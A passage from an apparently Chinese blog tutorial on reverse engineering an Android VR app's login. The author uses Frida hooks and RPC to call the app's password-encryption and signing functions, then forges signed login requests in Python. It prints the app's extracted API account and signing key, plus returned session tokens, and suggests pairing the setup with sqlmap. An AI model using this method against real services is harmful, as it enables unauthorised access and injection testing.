hashMap.put(<span class="string">&quot;enc&quot;</span>, e(str2)); <span class="comment">//根据hook分析代码得知,enc用e方法进行了加密</span></span><br><span class="line">       <span class="keyword">return</span> b.c(f.h(), a(hashMap));</span><br><span class="line">   &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><strong>enc生成</strong></p><p>e方法:,password传入点.</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">static</span> String <span class="title">e</span><span class="params">(String str)</span> </span>&#123;</span><br><span class="line">       String a2 = a(<span class="number">10</span>);</span><br><span class="line">       <span class="keyword">return</span> d(<span class="string">&quot;password=&quot;</span> + str + <span class="string">&quot;&amp;salt=&quot;</span> + a2); <span class="comment">//可见密码在str进行了拼接,a2为生成10为随机int整数.跟踪d方法发现有经过了各种骚操作,RSA加密等</span></span><br><span class="line">   &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><strong>sign分析:</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">static</span> Map&lt;String, String&gt; <span class="title">a</span><span class="params">(Map&lt;String, String&gt; map)</span> </span>&#123;</span><br><span class="line">       HashMap hashMap = <span class="keyword">new</span> HashMap();<span class="comment">//大致看一下符合我们抓包的请求参数,hook验证</span></span><br><span class="line">       hashMap.put(<span class="string">&quot;apiaccount&quot;</span>, <span class="string">&quot;vrpuc-aaf91f835147ce2d01216bd3bd5c3516&quot;</span>);</span><br><span class="line">       hashMap.put(<span class="string">&quot;timestamp&quot;</span>, String.valueOf(System.currentTimeMillis()));</span><br><span class="line">       TreeMap treeMap = <span class="keyword">new</span> TreeMap();</span><br><span class="line">       treeMap.putAll(hashMap);</span><br><span class="line">       <span class="keyword">if</span> (map != <span class="keyword">null</span>) &#123;</span><br><span class="line">           treeMap.putAll(map);</span><br><span class="line">       &#125;</span><br><span class="line">       hashMap.put(<span class="string">&quot;sign&quot;</span>, a((SortedMap&lt;String, String&gt;) treeMap));<span class="comment">//跟踪a方法</span></span><br><span class="line">       <span class="keyword">if</span> (map != <span class="keyword">null</span>) &#123;</span><br><span class="line">           hashMap.putAll(map);</span><br><span class="line">       &#125;</span><br><span class="line">       <span class="keyword">return</span> hashMap;</span><br><span class="line">   &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>a方法传入了一个sortedMap参数</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">static</span> String <span class="title">a</span><span class="params">(SortedMap&lt;String, String&gt; sortedMap)</span> </span>&#123;</span><br><span class="line">        StringBuffer stringBuffer = <span class="keyword">new</span> StringBuffer();</span><br><span class="line">        <span class="keyword">for</span> (Map.Entry&lt;String, String&gt; entry : sortedMap.entrySet()) &#123;</span><br><span class="line">            <span class="keyword">if</span> (!TextUtils.isEmpty(entry.getValue())) &#123;</span><br><span class="line">                stringBuffer.append(entry.getKey() + <span class="string">&quot;=&quot;</span> + entry.getValue() + <span class="string">&quot;&amp;&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        stringBuffer.append(<span class="string">&quot;key=a0f723c011346j39w049d7bf0356b34b&quot;</span>);<span class="comment">//添加Key到列表</span></span><br><span class="line">        <span class="keyword">return</span> D.d(stringBuffer.toString()).toUpperCase();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>hook打印a传的sortedMap值,先用.$className方法判断是什么类型</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">Java.perform(</span><br><span class="line">   <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">       <span class="built_in">console</span>.log(<span class="string">&#x27;dddd&#x27;</span>)</span><br><span class="line">       <span class="keyword">var</span> up = Java.use(<span class="string">&#x27;com.picovr.asstantphone.update.UpdateDialog&#x27;</span>)</span><br><span class="line">       up.a.overload(<span class="string">&#x27;com.picovr.asstantphone.update.UpdateDialog$a&#x27;</span>).implementation = <span class="function"><span class="keyword">function</span>(<span class="params">q</span>)</span>&#123;</span><br><span class="line">       <span class="built_in">console</span>.log(<span class="string">&#x27;111111&#x27;</span>)</span><br><span class="line">       &#125;</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">&#x27;coming&#x27;</span>) </span><br><span class="line">        <span class="keyword">var</span> dd = Java.use(<span class="string">&#x27;com.picovr.assistantphone.c.a.e&#x27;</span>) </span><br><span class="line">        dd.a.overload(<span class="string">&#x27;java.util.Map&#x27;</span>).implementation = <span class="function"><span class="keyword">function</span>(<span class="params">v</span>)</span>&#123;</span><br><span class="line">        <span class="keyword">var</span> p = Java.use(<span class="string">&#x27;java.util.HashMap&#x27;</span>).$new(v)</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">&#x27;map:&#x27;</span>+p)<span class="comment">//p.$className判断类型</span></span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.a(v)</span><br><span class="line">   &#125;</span><br><span class="line">   &#125;</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">#登录触发</span><br><span class="line"><span class="attr">map</span>:&#123;phone=<span class="number">18812345600</span>, enc=MVPmyQlPSf2n1T+JLgVqGG7KeWM19riPffsgeDKe66Eq4wpe0EMEpicfbYpvmDe38PNOnPkRsGrNi4CkdBQIytn1h6wNR9GVLjljndIkRM441q9RbrXUPA/h3X5VK3CEt5K71E6iZofyDOb/6HaqhG404jHrLCG/jwHOMCrfU1Q=&#125;<span class="comment">//+key=a0f723c011346j39w049d7bf0356b34b</span></span><br></pre></td></tr></table></figure><p><strong>sign生成</strong></p><p>跟踪d方法:</p><p>根据上面的分析我们就确定了d方法为生成sign的加密函数</p><p>我们就利用d方法进行远程调用,构造出map列表传入到d方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title">d</span><span class="params">(String str)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> (str == <span class="keyword">null</span> || str.length() == <span class="number">0</span>) ? <span class="string">&quot;&quot;</span> : d(str.getBytes());</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>经过分析,我们对<strong>enc</strong>的操作较为简单,只需要把密码传进入接收return值即可拼接出enc</p><p><strong>sign</strong>的操作需要把上一步return的enc值放到sign里面,再有d处理即可.</p><p>找到了我们需要的enc,和sign的两处加密代码,我们开始写frida-rpc和拼接请求参数</p><p><strong>RPC ｄｏｍｅ：</strong></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">test=<span class="string">&#x27;&#x27;</span><span class="string">&#x27;</span></span><br><span class="line"><span class="string">rpc.exports = &#123;</span></span><br><span class="line"><span class="string"> testfunc: function(str)&#123;//PS: 函数名不要大写</span></span><br><span class="line"><span class="string"> var enc = &#x27;</span><span class="string">&#x27; </span></span><br><span class="line"><span class="string"> Java.perform(function () &#123;</span></span><br><span class="line"><span class="string"> var a = Java.use(&quot;XXXXXXXXXXX&quot;);</span></span><br><span class="line"><span class="string"> enc = a.a(str)</span></span><br><span class="line"><span class="string"> &#125;);</span></span><br><span class="line"><span class="string"> return enc</span></span><br><span class="line"><span class="string"> &#125;</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">&#x27;</span><span class="string">&#x27;&#x27;</span></span><br></pre></td></tr></table></figure><p><strong>hook.py:</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> frida,sys</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">on_message</span>(<span class="params">message, data</span>):</span></span><br><span class="line">    <span class="keyword">if</span> message[<span class="string">&#x27;type&#x27;</span>] == <span class="string">&#x27;send&#x27;</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[*] &#123;0&#125;&quot;</span>.<span class="built_in">format</span>(message[<span class="string">&#x27;payload&#x27;</span>]))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(message)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">test = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">rpc.exports = &#123;</span></span><br><span class="line"><span class="string">func1: function(str)&#123;  //定义函数名</span></span><br><span class="line"><span class="string">var enc = &#x27;&#x27; </span></span><br><span class="line"><span class="string">Java.perform(function () &#123;</span></span><br><span class="line"><span class="string">var a = Java.use(&quot;com.picovr.assistantphone.c.a.e&quot;);</span></span><br><span class="line"><span class="string">enc = a.e(str)</span></span><br><span class="line"><span class="string">&#125;);</span></span><br><span class="line"><span class="string">return enc</span></span><br><span class="line"><span class="string">&#125;,</span></span><br><span class="line"><span class="string">func2: function(str)&#123;  //定义函数名</span></span><br><span class="line"><span class="string"> var sign = &#x27;&#x27; </span></span><br><span class="line"><span class="string"> Java.perform(function () &#123;</span></span><br><span class="line"><span class="string"> var aa = Java.use(&quot;com.blankj.utilcode.util.D&quot;);</span></span><br><span class="line"><span class="string"> sign = aa.d(str)</span></span><br><span class="line"><span class="string"> &#125;);</span></span><br><span class="line"><span class="string"> return sign</span></span><br><span class="line"><span class="string"> &#125;</span></span><br><span class="line"><span class="string">&#125; </span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">start_rpc</span>():</span></span><br><span class="line">    process = frida.get_usb_device(-<span class="number">1</span>).attach(<span class="string">&#x27;text&#x27;</span>)</span><br><span class="line">    script = process.create_script(test)</span><br><span class="line">    script.on(<span class="string">&#x27;message&#x27;</span>, on_message)</span><br><span class="line">    script.load()</span><br><span class="line"></span><br><span class="line">    <span class="comment">#script.exports.func2() //调用方法</span></span><br><span class="line">    <span class="keyword">return</span> script.exports //把exports <span class="keyword">return</span>出去外面</span><br><span class="line">    <span class="comment">#sys.stdin.read()</span></span><br></pre></td></tr></table></figure><p><strong>rpc-hook.py:</strong></p><p>从hook的两个加密函数,远程调用接收返回结果,在利用 requests库进行构造请求,从而达到不去逆向算法,直接调用的曲线救国方法.缺点是大规模发包可能不够稳定.如果放到服务器上可以进行端口转发穿透内网.如果要进一步测试需用flask模块进行中转,可配合sqlmap.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> hook  <span class="comment">#引入hook.py</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">exports = jj.start_rpc函数()<span class="comment">#调用hook.py里的start_rpc函数</span></span><br><span class="line">apiaccount = <span class="string">&quot;vrpuc-aaf91f835147ce2d01216bd3bd5c3516&quot;</span></span><br><span class="line">phone = <span class="string">&#x27;18812345600&#x27;</span></span><br><span class="line">pwd= <span class="string">&quot;qwe123456&quot;</span></span><br><span class="line">timestamp = <span class="built_in">int</span>(time.time()*<span class="number">1000</span>)</span><br><span class="line">enc = exports.func1(pwd)  <span class="comment">#传入pwd值并接收返回结果</span></span><br><span class="line">signn = <span class="string">&quot;apiaccount=vrpuc-aaf91f835147ce2d01216bd3bd5c3516&amp;enc=&#123;0&#125;&amp;phone=18812345600&amp;timestamp=&#123;1&#125;&amp;key=a0f723c011346j39w049d7bf0356b34b&quot;</span>.<span class="built_in">format</span>(enc,timestamp)</span><br><span class="line">sign = exports.func2(signn) <span class="comment">#传入signn值并接收返回结果</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;sign:&#x27;</span>,sign)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;enc:&#x27;</span>,enc)</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;http://api.passport.text.com/loginUser&#x27;</span></span><br><span class="line">data= &#123;<span class="string">&quot;apiaccount&quot;</span>:apiaccount,<span class="string">&quot;timestamp&quot;</span>:timestamp,<span class="string">&quot;phone&quot;</span>:phone,<span class="string">&quot;enc&quot;</span>:enc,<span class="string">&quot;sign&quot;</span>:sign&#125;</span><br><span class="line">header = &#123;</span><br><span class="line">    <span class="string">&quot;Host&quot;</span>:<span class="string">&quot;api.passport.picovr.com&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Accept-Encoding&quot;</span>:<span class="string">&quot;gzip&quot;</span>,</span><br><span class="line">    <span class="string">&quot;User-Agent&quot;</span>:<span class="string">&quot;okhttp/3.11.0&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Content-Type&quot;</span>:<span class="string">&quot;application/x-www-form-urlencoded&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Accept&quot;</span>:<span class="literal">None</span>    <span class="comment">#把请求参数置空</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">ret = requests.post(url,data=data,headers=header)</span><br><span class="line">res = ret.text</span><br><span class="line"><span class="built_in">print</span>(res)</span><br></pre></td></tr></table></figure><p>请求成功:</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="attr">&quot;data&quot;</span>:&#123;<span class="attr">&quot;refresh_token&quot;</span>:<span class="string">&quot;LJA0GGff3veBktlBkEnLBmHryI0TAuhDSTups94RWZj4LPKbpQqUZJuvfjvt+8NPaHz41oSyObaLwJYLoUenSQO9g8D37LT3Mw5/RI2FNHHAHDuqJ36cMRlPQy8TgVisHV/pYDlXsVI1a34g9JHSpfqFKgYlaMJaLLM1Fk52924=&quot;</span>,<span class="attr">&quot;user_token_expire_time&quot;</span>:<span class="number">5183999</span>,<span class="attr">&quot;sign&quot;</span>:<span class="string">&quot;6486813B4CDFC31F7A00A9B9C37D0E36&quot;</span>,<span class="attr">&quot;user_fresh_token_expire_time&quot;</span>:<span class="number">5184000</span>,<span class="attr">&quot;token&quot;</span>:<span class="string">&quot;009052b7951f4da844be006bd239759ec70493520b992ce37381bb3fd4b0c0fbef7842572a9feb6ecf236ccc89ece46dd6f1afba86d1a403ee801fbbf3c196dd2a96f6770fc0e6a18420ed8aa3093f777342d0fd36dcf1dcaa0815c5aaab85e7a2490-1.0.1&quot;</span>,<span class="attr">&quot;timestamp&quot;</span>:<span class="string">&quot;1647965072111&quot;</span>&#125;,<span class="attr">&quot;ret_msg&quot;</span>:<span class="string">&quot;成功&quot;</span>,<span class="attr">&quot;ret_code&quot;</span>:<span class="string">&quot;success&quot;</span>&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;&lt;strong&gt;抓包分析app:&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;登录POST请求:&lt;/p&gt;
&lt;figure class=&quot;highlight xml&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/spa</summary>
      
    
    
    
    
    <category term="逆向" scheme="https://bstark.me/tags/%E9%80%86%E5%90%91/"/>
    
  </entry>
  
</feed>
